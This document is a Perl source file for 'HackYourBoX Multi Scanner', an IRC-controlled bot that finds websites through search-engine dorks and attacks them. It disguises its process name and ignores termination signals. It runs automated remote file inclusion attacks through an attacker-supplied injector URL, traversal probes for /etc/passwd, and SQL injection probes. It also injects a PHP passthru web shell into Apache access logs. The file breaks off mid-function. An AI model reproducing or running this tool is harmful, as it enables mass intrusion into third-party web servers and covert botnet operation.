#!/usr/bin/perl

################################################
# HackYourBoX Multi Scanner v5.0 Final Release #
# Coded by bL4Ck_3n91n3 #
# staff[at]hackyourbox[dot]org #
# Copyleft &#169; 2009 HackYourBoX #
################################################
# perl hyx.txt help me !!! #
################################################
# Dipersilahkan yang Ingin Menambah Engine #
################################################


use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;
use IO::Select;
use Socket;


my $fakeproc = $ARGV[6];
$ircserver = $ARGV[0] unless $ircserver;
my $ircport = $ARGV[1];
my $nickname = $ARGV[2];
my $ident = $ARGV[3];
my $channel = '#'.$ARGV[4];
my $runner = $ARGV[5];
my $fullname = '0,1[5,1~15,1]9,1 HackYourBoX-Multi-Scanner 15,1[5,1~0,1]';


my $injector = $ARGV[7];
my $phpshell = $ARGV[8];
my $rficmd = '!rfi';
my $lficmd = '!lfi';
my $sqlcmd = '!sql';
my $alicmd = '!ali';


$rfi_result = "v0pCr3w";
$lfi_test = "../../../../../../../../../../../../../../../etc/passwd%00";
$lfi_output = "root:(.+):(.+):(.+):(.+):(.+):(.+)";
$sql_test = "'";
$sql_output = ("sql syntax|sql error|right syntax to use near|syntax error converting|unclosed quotation");


my $success = "\n [+] VopCrew Multi Scanner\n [-] Loading Successfully ...\n [-] Process/PID : $fakeproc - $$\n";
my $failed = "\n [-] perl $0 <host> <port> <nick> <ident> <chan> <admin> <fakeproc> <injector> <phpshell>\n\n";
if (! $ARGV[1]){die ($failed);}
if (! $ARGV[2]){die ($failed);}
if (! $ARGV[3]){die ($failed);}
if (! $ARGV[4]){die ($failed);}
if (! $ARGV[5]){die ($failed);}
if (! $ARGV[6]){die ($failed);}
if (! $ARGV[7]){die ($failed);}
if (! $ARGV[8]){die ($failed);}
print $success;


$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';


chdir("/");
$ircserver="$ARGV[0]" if $ARGV[0];
$0 = "$fakeproc"."\0"x16;;
my $pid = fork;
exit if $pid;
die "\n [!] Something Wrong !!!: $!" unless defined($pid);


our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();


sub sendraw {
if ($#_ == '1') {
my $socket = $_[0];
print $socket "$_[1]\n";
} else {
print $IRC_cur_socket "$_[0]\n";
}
}


sub connector {
my $mynick = $_[0];
my $ircserver_con = $_[1];
my $ircport_con = $_[2];
my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
if (defined($IRC_socket)) {
$IRC_cur_socket = $IRC_socket;
$IRC_socket->autoflush(1);
$sel_client->add($IRC_socket);
$irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
$irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
$irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
nick("$mynick");
sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$fullname");
sleep 1;
}
}


sub parse {
my $servarg = shift;
if ($servarg =~ /^PING \:(.*)/) {
sendraw("PONG :$1");
} elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
if ($args =~ /^\001VERSION\001$/) {
notice("$pn", "\001VERSION mIRC v6.17 Khaled Mardam-Bey\001");
}
if ($args =~ /^(\Q$mynick\E|\!a)\s+(.*)/ ) {
my $natrix = $1;
my $arg = $2;
}
}
elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
if (lc($1) eq lc($mynick)) {
$mynick=$4;
$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
}
} elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
nick("$mynick|".int rand(999));
} elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
$mynick = $2;
$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
$irc_servers{$IRC_cur_socket}{'nome'} = "$1";
sendraw("MODE $nickname +Bx");
sendraw("JOIN $channel");
sendraw("PRIVMSG $channel :yihaaaa");
sendraw("PRIVMSG $runner :Hi $runner you are gay !!!");
}
}


my $line_temp;
while( 1 ) {
while (!(keys(%irc_servers))) { connector("$nickname", "$ircserver", "$ircport"); }
delete($irc_servers{''}) if (defined($irc_servers{''}));
my @ready = $sel_client->can_read(0);
next unless(@ready);
foreach $fh (@ready) {
$IRC_cur_socket = $fh;
$mynick = $irc_servers{$IRC_cur_socket}{'nick'};
$nread = sysread($fh, $msg, 4096);
if ($nread == 0) {
$sel_client->remove($fh);
$fh->close;
delete($irc_servers{$fh});
}
@lines = split (/\n/, $msg);
$msg =~ s/\r\n$//;


################################################## ###################
############################[ CMD LIST ]#############################
################################################## ###################


if ($msg=~ /PRIVMSG $channel :!help/){
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1~15,1]9,1 Start RFI Scanning : $rficmd <bug> <dork> 15,1[5,1~0,1]");
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1~15,1]9,1 Start LFI Scanning : $lficmd <bug> <dork> 15,1[5,1~0,1]");
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1~15,1]9,1 Start SQL Scanning : $sqlcmd <bug> <dork> 15,1[5,1~0,1]");
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1~15,1]9,1 Apache Log Injection : $alicmd <host> <port> 15,1[5,1~0,1]");
}


if ($msg=~ /PRIVMSG $channel :!id/){
&response();
}


if ($msg=~ /PRIVMSG $channel :!version/){
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1~15,1]9,1 HackYourBoX Multi Scanner v5.0 Final Release 15,1[5,1~0,1]");
}


if ($msg=~ /PRIVMSG $channel :!engine/){
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1~15,1]9,1 Google, MSN, AllTheWeb, Altavista, ASK, UOL, GigaBlast, LyCos. 15,1[5,1~0,1]");
}


if ($msg=~ /PRIVMSG $channel :!pid/){
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1~15,1]9,1 Process/ID : 4,1 $fakeproc - $$ 15,1[5,1~0,1]");
}


if ($msg=~ /PRIVMSG $channel :!about/){
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1about15,1]9,1 HackYourBoX Multi Scanner v5.0 Final Release 15,1[5,1about0,1]");
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1about15,1]9,1 ReCoded by bL4Ck_3n91n3 - http://0wn3d.biz/ 15,1[5,1about0,1]");
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1about15,1]9,1 Copyleft &#169; 2009 HackYourBoX 15,1[5,1about0,1]");
}


################################################## ###################
###############################[ RFI ]###############################
################################################## ###################


################################################## ################### Google Engine
if ($msg=~ /PRIVMSG $channel :$rficmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "GooGLe";
my $bugx = $1;
my $d0rk = $2;
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1RFI15,1]9,1 Dork :4,1 $d0rk 15,1[5,1RFI0,1]");
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1RFI15,1]9,1 File :4,1 $bugx 15,1[5,1RFI0,1]");
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1RFI15,1]9,19,1 Search Engine Loading ... 15,1[5,1RFI0,1]");
&rfiscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ################### AllTheWeb Engine
if ($msg=~ /PRIVMSG $channel :$rficmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "AllTheWeb";
my $bugx = $1;
my $d0rk = $2;
&rfiscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ################### MSN Engine
if ($msg=~ /PRIVMSG $channel :$rficmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "MsN";
my $bugx = $1;
my $d0rk = $2;
&rfiscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ################### Altavista Engine
if ($msg=~ /PRIVMSG $channel :$rficmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "ALtaViSTa";
my $bugx = $1;
my $d0rk = $2;
&rfiscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ################### ASK Engine
if ($msg=~ /PRIVMSG $channel :$rficmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "AsK";
my $bugx = $1;
my $d0rk = $2;
&rfiscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ################### UoL Engine
if ($msg=~ /PRIVMSG $channel :$rficmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "UoL";
my $bugx = $1;
my $d0rk = $2;
&rfiscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ################### GigaBlast Engine
if ($msg=~ /PRIVMSG $channel :$rficmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "GiGaBLaST";
my $bugx = $1;
my $d0rk = $2;
&rfiscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ################### LyCos Engine
if ($msg=~ /PRIVMSG $channel :$rficmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "LyCos";
my $bugx = $1;
my $d0rk = $2;
&rfiscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ###################
###############################[ LFI ]###############################
################################################## ###################


################################################## ################### Google Engine
if ($msg=~ /PRIVMSG $channel :$lficmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "GooGLe";
my $bugx = $1;
my $d0rk = $2;
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1LFI15,1]9,1 Dork :4,1 $d0rk 15,1[5,1LFI0,1]");
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1LFI15,1]9,1 File :4,1 $bugx 15,1[5,1LFI0,1]");
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1LFI15,1]9,19,1 Search Engine Loading ... 15,1[5,1LFI0,1]");
&lfiscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ################### AllTheWeb Engine
if ($msg=~ /PRIVMSG $channel :$lficmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "AllTheWeb";
my $bugx = $1;
my $d0rk = $2;
&lfiscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ################### MSN Engine
if ($msg=~ /PRIVMSG $channel :$lficmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "MsN";
my $bugx = $1;
my $d0rk = $2;
&lfiscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ################### Altavista Engine
if ($msg=~ /PRIVMSG $channel :$lficmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "ALtaViSTa";
my $bugx = $1;
my $d0rk = $2;
&lfiscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ################### ASK Engine
if ($msg=~ /PRIVMSG $channel :$lficmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "AsK";
my $bugx = $1;
my $d0rk = $2;
&lfiscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ################### UoL Engine
if ($msg=~ /PRIVMSG $channel :$lficmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "UoL";
my $bugx = $1;
my $d0rk = $2;
&lfiscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ################### GigaBlast Engine
if ($msg=~ /PRIVMSG $channel :$lficmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "GiGaBLaST";
my $bugx = $1;
my $d0rk = $2;
&lfiscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ################### LyCos Engine
if ($msg=~ /PRIVMSG $channel :$lficmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "LyCos";
my $bugx = $1;
my $d0rk = $2;
&lfiscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ###################
###############################[ SQL ]###############################
################################################## ###################


################################################## ################### Google Engine
if ($msg=~ /PRIVMSG $channel :$sqlcmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "GooGLe";
my $bugx = $1;
my $d0rk = $2;
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1SQL15,1]9,1 Dork :4,1 $d0rk 15,1[5,1SQL0,1]");
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1SQL15,1]9,1 File :4,1 $bugx 15,1[5,1SQL0,1]");
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1SQL15,1]9,19,1 Search Engine Loading ... 15,1[5,1SQL0,1]");
&sqlscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ################### AllTheWeb Engine
if ($msg=~ /PRIVMSG $channel :$sqlcmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "AllTheWeb";
my $bugx = $1;
my $d0rk = $2;
&sqlscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ################### MSN Engine
if ($msg=~ /PRIVMSG $channel :$sqlcmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "MsN";
my $bugx = $1;
my $d0rk = $2;
&sqlscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ################### Altavista Engine
if ($msg=~ /PRIVMSG $channel :$sqlcmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "ALtaViSTa";
my $bugx = $1;
my $d0rk = $2;
&sqlscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ################### ASK Engine
if ($msg=~ /PRIVMSG $channel :$sqlcmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "AsK";
my $bugx = $1;
my $d0rk = $2;
&sqlscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ################### UoL Engine
if ($msg=~ /PRIVMSG $channel :$sqlcmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "UoL";
my $bugx = $1;
my $d0rk = $2;
&sqlscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ################### GigaBlast Engine
if ($msg=~ /PRIVMSG $channel :$sqlcmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "GiGaBLaST";
my $bugx = $1;
my $d0rk = $2;
&sqlscan($engx,$bugx,$d0rk);
}
exit;
}
}

################################################## ################### Lycos Engine
if ($msg=~ /PRIVMSG $channel :$sqlcmd\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "LyCos";
my $bugx = $1;
my $d0rk = $2;
&sqlscan($engx,$bugx,$d0rk);
}
exit;
}
}


################################################## ###################
################################################## ################### Apache Log Injection
if ($msg=~ /PRIVMSG $channel :$alicmd\s+(.*?)\s+(.+[0-9])/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
&injectlog($1,$2);
}
exit;
}
}


for(my $c=0; $c<= $#lines; $c++) {
$line = $lines[$c];
$line=$line_temp.$line if ($line_temp);
$line_temp='';
$line =~ s/\r$//;
unless ($c == $#lines) {
parse("$line");
} else {
if ($#lines == 0) {
parse("$line");
} elsif ($lines[$c] =~ /\r$/) {
parse("$line");
} elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
parse("$line");
} else {
$line_temp = $line;
}
}
}
}
}


################################################## ################### Procedure


sub injectlog() {
my $host = $_[0];
my $port = $_[1];
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1~15,1]9,1 Injecting7,1 ".$host.":".$port." 12,1Apache Access Log ... 15,1[5,1~0,1]");
my $php = "<?php if(get_magic_quotes_gpc()){ \$_GET[hyx]=stripslashes(\$_GET[hyx]);} passthru(\$_GET[hyx]);?>";
$sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => 80, Proto => "tcp") ||
die sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2ALI15)4 Cant Connect to7 ".$host.":".$port."");
print $sock "GET /HackYourBoX.UnderGrounD ".$php." HTTP/1.1\r\n";
print $sock "Host: ".$host."\r\n";
print $sock "Connection: close\r\n\r\n";
close($sock);
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1~15,1]7,1 ".$host." 12,1is Done ... 15,1[5,1~0,1]");
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1~15,1]7,1 ".$host." 12,1RCE Parameter ->3,1 hyx 15,1[5,1~0,1]");
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1~15,1]7,1 ".$host." 12,1RCE Identifier ->3,1 HackYourBoX.UnderGrounD 15,1[5,1~0,1]");
}


sub rfiscan() {
my $engz = $_[0];
my $bugz = $_[1];
my $dork = $_[2];
my $contatore = 0;
if ($engz =~ /GooGLe/) {
my @google=&google($dork);
push(@total, @google);
}
if ($engz =~ /AllTheWeb/) {
my @alltheweb=&alltheweb($dork);
push(@total, @alltheweb);
}
if ($engz =~ /MsN/) {
my @msn=&msn($dork);
push(@total, @msn);
}
if ($engz =~ /ALtaViSTa/) {
my @altavista=&altavista($dork);
push(@total, @altavista);
}
if ($engz =~ /AsK/) {
my @ask=&ask($dork);
push(@total, @ask);
}
if ($engz =~ /UoL/) {
my @uol=&uol($dork);
push(@total, @uol);
}
if ($engz =~ /GiGaBLaST/) {
my @gigablast=&gigablast($dork);
push(@total, @gigablast);
}
if ($engz =~ /LyCos/) {
my @lycos=&lycos($dork);
push(@total, @lycos);
}
my @clean=&calculate(@total);
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1RFI15,1]9,10,1[5,1$engz15,1]9,1 Total:4,1 (".scalar(@total).")12,1 Clean:4,1 (".scalar(@clean).") 15,1[5,1RFI0,1]");
if (scalar(@clean) != 0) {
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1RFI15,1]9,10,1[5,1$engz15,1]9,1 Exploiting4,1 $dork 15,1[5,1RFI0,1]");
}
my $uni=scalar(@clean);
foreach my $target (@clean)
{
$contatore++;
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1RFI15,1]9,10,1[5,1$engz15,1]9,1 Scan Finish for14,1 $dork 15,1[5,1RFI0,1]");
}
my $xpl = "http://".$target.$bug.$injector."?";
my $vuln = "http://".$target."12,1".$bugz."7,1".$phpshell."?";
my $re = getcontent($xpl);
if($re =~ /$rfi_result/ && $re =~ /uid=/){
os($xpl);
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1RFI15,1]9,10,1[5,1Vulnerable15,1]9,1 ".$vuln." 15,1[5,1SAFEMODE-CROT0,1]");
}
elsif($re =~ /$rfi_result/)
{
os($xpl);
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1RFI15,1]9,10,1[5,1Vulnerable15,1]9,1 ".$vuln." 15,1[5,1SAFEMODE-FUCK0,1]");
}
}
}


sub lfiscan() {
my $engz = $_[0];
my $bugz = $_[1];
my $dork = $_[2];
my $contatore = 0; 
if ($engz =~ /GooGLe/) {
my @google=&google($dork);
push(@total, @google);
}
if ($engz =~ /AllTheWeb/) {
my @alltheweb=&alltheweb($dork);
push(@total, @alltheweb);
}
if ($engz =~ /MsN/) {
my @msn=&msn($dork);
push(@total, @msn);
}
if ($engz =~ /ALtaViSTa/) {
my @altavista=&altavista($dork);
push(@total, @altavista);
}
if ($engz =~ /AsK/) {
my @ask=&ask($dork);
push(@total, @ask);
}
if ($engz =~ /UoL/) {
my @uol=&uol($dork);
push(@total, @uol);
}
if ($engz =~ /GiGaBLaST/) {
my @gigablast=&gigablast($dork);
push(@total, @gigablast);
}
if ($engz =~ /LyCos/) {
my @lycos=&lycos($dork);
push(@total, @lycos);
}
my @clean = &calculate(@total);
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1LFI15,1]9,10,1[5,1$engz15,1]9,1 Total:4,1 (".scalar(@total).")12,1 Clean:4,1 (".scalar(@clean).") 15,1[5,1LFI0,1]");
if (scalar(@clean) != 0) {
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1LFI15,1]9,10,1[5,1$engz15,1]9,1 Exploiting4,1 $dork 15,1[5,1LFI0,1]");
}
my $uni=scalar(@clean);
foreach my $target (@clean)
{
$contatore++;
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1LFI15,1]9,10,1[5,1$engz15,1]9,1 Scan Finish for14,1 $dork 15,1[5,1LFI0,1]");
}
my $xpl = "http://".$target.$bugz.$lfi_test;
my $vuln = "http://".$target."12,1".$bugz."7,1".$lfi_test."";
my $re = getcontent($xpl);
if ($re =~ /$lfi_output/){
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1LFI15,1]9,10,1[5,1Vulnerable15,1]9,1 ".$vuln." 15,1[5,1LFI0,1]");
}
}
}


sub sqlscan() {
my $engz = $_[0];
my $bugz = $_[1];
my $dork = $_[2];
my $contatore = 0;
if ($engz =~ /GooGLe/) {
my @google=&google($dork);
push(@total, @google);
}
if ($engz =~ /AllTheWeb/) {
my @alltheweb=&alltheweb($dork);
push(@total, @alltheweb);
}
if ($engz =~ /MsN/) {
my @msn=&msn($dork);
push(@total, @msn);
}
if ($engz =~ /ALtaViSTa/) {
my @altavista=&altavista($dork);
push(@total, @altavista);
}
if ($engz =~ /AsK/) {
my @ask=&ask($dork);
push(@total, @ask);
}
if ($engz =~ /UoL/) {
my @uol=&uol($dork);
push(@total, @uol);
}
if ($engz =~ /GiGaBLaST/) {
my @gigablast=&gigablast($dork);
push(@total, @gigablast);
}
if ($engz =~ /LyCos/) {
my @lycos=&lycos($dork);
push(@total, @lycos);
}
my @clean = &calculate(@total);
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1SQL15,1]9,10,1[5,1$engz15,1]9,1 Total:4,1 (".scalar(@total).")12,1 Clean:4,1 (".scalar(@clean).") 15,1[5,1SQL0,1]");
if (scalar(@clean) != 0) {
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1SQL15,1]9,10,1[5,1$engz15,1]9,1 Exploiting4,1 $dork 15,1[5,1SQL0,1]");
}
my $uni = scalar(@clean);
foreach my $target (@clean)
{
$contatore++;
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1SQL15,1]9,10,1[5,1$engz15,1]9,1 Scan Finish for14,1 $dork 15,1[5,1SQL0,1]");
}
my $xpl = "http://".$target.$bugz.$sql_test;
my $vuln = "http://".$target."12,1".$bugz."15,1[5,1SQL0,1]";
my $re = getcontent($xpl);
if ($re =~ /$sql_output/){
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1SQL15,1]9,10,1[5,1Vulnerable15,1]9,1 ".$vuln." ");
}
}
}


sub os() {
my $site = $_[0];
my $re = &query($site);
while ($re =~ m/<br>os:(.+?)\<br>/g) {
$os = $1;
if ($os =~ //) { my $os = "try-not-to-advertise"; }
}
}


sub response() {
my $re = getcontent($injector);
if ($re =~ /pZLNd8MwEITvg/) {
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1ID15,1]9,1 &#171; 3,1OK12,1 &#187; 15,1[5,1ID0,1]");
}
else {
sendraw($IRC_cur_socket, "PRIVMSG $channel :0,1[5,1ID15,1]9,1 &#171; 4,1MOKAD12,1 &#187; 15,1[5,1ID0,1]");
}
}


sub getcontent() {
$url = $_[0];
my $req = HTTP::Request->new(GET => $url);
my $ua = LWP::UserAgent->new();
$ua->timeout(5);
my $response = $ua->request($req);
return $response->content;
}


sub google(){
my @lst;
my $key = $_[0];
for ($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.com/search?q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go);
while ($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}
}
}
return @lst;
}


sub alltheweb() {
my @lst;
my $key = $_[0];
my $i = 0;
my $pg = 0;
for ( $i = 0 ; $i <= 1000 ; $i += 100 ) {
my $all = ("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
my $Res = query($all);
while ( $Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g ) {
my $k = $1;
$k =~ s/ //g;
my @grep = links($k);
push( @lst, @grep );
}
}
return @lst;
}


sub uol() {
my @lst;
my $key = $_[0];
for ( $b = 1 ; $b <= 1000 ; $b += 10 ) {
my $UoL = ("http://mundo.busca.uol.com.br/buscar.html?q=".key($key)."&start=".$i);
my $Res = query($UoL);
while ( $Res =~ m/<a href=\"http:\/\/([^>\"]*)/g ) {
my $k = $1;
if ( $k !~ /busca|uol|yahoo/ ) {
my $k = $1;
my @grep = links($k);
push( @lst, @grep );
}
}
}
return @lst;
}


sub msn() {
my @lst;
my $key = $_[0];
for ( $b = 1 ; $b <= 1000 ; $b += 10 ) {
my $MsN = ("http://search.live.com/results.aspx?q=".key($key)."&first=".$b."&FORM=PERE");
my $Res = query($MsN);
while ( $Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
if ( $1 !~ /msn|live/ ) {
my $k = $1;
my @grep = links($k);
push( @lst, @grep );
}
}
}
return @lst;
}


sub altavista(){
my @lst;
my $key = $_[0];
for ($b=1;$b<=1000;$b+=10){
my $AlT=("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while ($Res=~m/<span class=ngrn>(.+?)\//g){
if ($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}
}
}
return @lst;
}


sub ask() {
my @lst;
my $key = $_[0];
my $i = 0;
my $pg = 0;
for ( $i = 0 ; $i <= 1000 ; $i += 10 ) {
my $Ask = ("http://it.ask.com/web?q=".key($key)."&o=0&l=dir&qsrc=0&qid=EE90DE6E8F5370F363A63EC61228D4FE&dm=all&page=".$i);
my $Res = query($Ask);
while ($Res =~ m/href=\"http:\/\/(.+?)\" onmousedown=/g) {
if ($1 !~ /ask.com/){
my $k = $1;
my @grep = links($k);
push( @lst, @grep );
}
}
}
return @lst;
}


sub gigablast() {
my @lst;
my $key = $_[0];
for ($i = 0; $i <= 1000; $i += 10) {
my $giga = ("http://www.gigablast.com/search?s=".$i."&q=".key($key));
my $Res = query($giga);
while ($Res =~ m/href=http:\/\/(.+?)><font/g) {
if ($1 !~ /answers|gigablast|google|yahoo|msn|teoma|dmoz/){
my $k = $1;
my @grep = links($k);
push(@lst, @grep);
}
}
}
return @lst;
}


sub lycos() {
my @lst;
my $key = $_[0];
for ($i = 0; $i <= 1000; $i += 10) {
my $lyc = ("http://cerca.lycos.it/cgi-bin/pursuit?pag=".$i."&query=".key($key)."&cat=web&enc=utf-8");
my $Res = query($lyc);
while ($Res =~ m/href=\"http:\/\/(.+?)\" >/g) {
if ($1 !~ /lycos/){
my $k = $1;
my @grep = links($k);
push(@lst, @grep);
}
}
}
return @lst;
}


sub links() {
my @l;
my $link = $_[0];
my $host = $_[0];
my $hdir = $_[0];
$hdir =~ s/(.*)\/[^\/]*$/\1/;
$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host .= "/";
$link .= "/";
$hdir .= "/";
$host =~ s/\/\//\//g;
$hdir =~ s/\/\//\//g;
$link =~ s/\/\//\//g;
push( @l, $link, $host, $hdir );
return @l;
}


sub key() {
my $dork = $_[0];
$dork =~ s/ /\+/g;
$dork =~ s/:/\%3A/g;
$dork =~ s/\//\%2F/g;
$dork =~ s/&/\%26/g;
$dork =~ s/\"/\%22/g;
$dork =~ s/,/\%2C/g;
$dork =~ s/\\/\%5C/g;
return $dork;
}


sub query($) {
my $url = $_[0];
$url =~ s/http:\/\///;
